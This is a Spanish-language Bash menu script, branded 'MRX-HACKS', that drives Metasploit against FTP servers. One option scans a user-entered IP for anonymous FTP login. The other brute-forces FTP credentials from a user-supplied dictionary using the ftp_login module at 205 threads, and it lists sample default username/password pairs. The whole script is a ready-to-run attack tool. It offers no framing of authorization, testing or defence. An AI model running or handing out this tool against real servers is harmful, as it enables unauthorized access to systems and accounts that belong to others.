#! /bin/bash

clear
echo -e "\e[1;33m __  __ ____  _____ _____ _____\e[0m\e[1;34m ____  _\e[0m"
echo -e "\e[1;33m|  \/  / ___||  ___|_   _|  _  1\e[0m\e[1;34m___ \/ |\e[0m"
echo -e "\e[1;33m| |\/| \___ \| |_    | | | |_) /\e[0m\e[1;34m__) /| |\e[0m"
echo -e "\e[1;33m| |  | |___) |  _|   | | |  __/\e[0m\e[1;34m/ __/ | |\e[0m"
echo -e "\e[1;33m|_|  |_|____/|_|     |_| |_|\e[0m  \e[1;34m|_____/|_|\e[0m"
echo ""
echo -e "\e[1;34m=========================================\e[0m"
echo -e " \e[1;31mRequisito : Tener instalado Metasploit\e[0m"
echo -e "\e[1;34m=========================================\e[0m"
while :
do
echo ""
setterm -foreground cyan
echo "*Escojer una opcion"
echo ""
echo -e "\e[1;37m[\e[0m\e[1;31m1\e[0m\e[1;37m]\e[0m\e[0m\e[1;32mEscaneo Server FTP a una IP\e[0m"
echo -e "\e[1;37m[\e[0m\e[1;31m2\e[0m\e[1;37m]\e[0m\e[0m\e[1;32mAtacar Server FTP a una IP\e[0m"
echo -e "\e[1;37m[\e[0m\e[1;31m00\e[0m\e[1;37m]\e[0m\e[0m\e[1;32mSalir\e[0m"
echo -e -n "\e[1;37m[#]Opcion >>\e[0m "
read opcion
case $opcion in
1)
#! /bin/bash
clear
setterm -foreground red
echo ""
cat baner.txt
echo ""
echo -e -n "\e[1;37m[\e[0m\e[1;31m~\e[0m\e[1;37m]\e[0m \e[1;34mIP ==>\e[0m \e[1;37m\e[0m"
read ip
echo ""
echo -e -n "\e[1;37m[\e[0m\e[1;31m~\e[0m\e[1;37m]\e[0m \e[1;34mPuerto ==>\e[0m \e[1;37m\e[0m"
read puerto
echo ""
echo -e -n "\e[1;37m[\e[0m\e[1;31m~\e[0m\e[1;37m]\e[0m \e[1;34mConexion ==>\e[0m \e[1;37m55\e[0m"
echo ""
echo ""
echo "-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#"
sleep 1
echo ""
echo -e "\e[1;37m[#]Cargando Metasploit ...\e[0m"
echo ""
msfconsole -q -x "use auxiliary/scanner/ftp/anonymous;set RHOST $ip;set RPORT $puerto;set THREADS 55;run"
;;
2)
#! /bin/bash
clear
setterm -foreground green
echo ""
cat banner.txt
echo ""
figlet Brute FTP
echo ""
echo -e "\e[1;34m-------------------------------------------\e[0m"
echo -e "\e[1;31mEjemplo de ruta : /HOME/diccionario.txt"
echo -e "\e[1;34m-------------------------------------------\e[0m"
echo ""
echo -e "\e[1;32mdiccionario.txt segun sus users y passwords\e[0m"
echo -e "\e[1;31mEjemplo :\e[0m"
echo ""
echo -e "\e[1;34m--------------------\e[0m"
echo -e "\e[1;37mUser       Password\e[0m"
echo -e "\e[1;37madmin      12345678\e[0m"
echo -e "\e[1;37moracle     ftp21www\e[0m"
echo -e "\e[1;37madmin      admin\e[0m"
echo -e "\e[1;37manonymous  anonymous\e[0m" 
echo -e "\e[1;34m--------------------\e[0m"
echo ""
echo -n -e "\e[1;37m[\e[0m\e[1;32m~\e[0m\e[1;37m]\e[0m\e[0m \e[1;32mIP ==>\e[0m \e[1;37m\e[0m"
read a
echo ""
echo -n -e "\e[1;37m[\e[0m\e[1;32m~\e[0m\e[1;37m]\e[0m\e[0m \e[1;32mPuerto ==>\e[0m \e[1;37m\e[0m"
read b
echo ""
echo -n -e "\e[1;37m[\e[0m\e[1;32m~\e[0m\e[1;37m]\e[0m\e[0m\e[1;32mRuta del diccionario.txt ==>\e[0m \e[1;37m\e[0m"
read d
sleep 1
echo ""
echo ""
echo -e "\e[1;37m[#]Cargando Metasploit ...\e[0m"
echo ""
msfconsole -q -x "use auxiliary/scanner/ftp/ftp_login;set RHOST $a;set THREADS 205;set USERPASS_FILE $d;set VERBOSE false;run"
;;
00)
#! /bin/bash
echo ""
echo -e "\e[1;33m[~]\e[0m\e[1;35mHa salido de la Herramienta, By.MRX-HACKS\e[0m"
sleep 1
exit
;;
esac
done
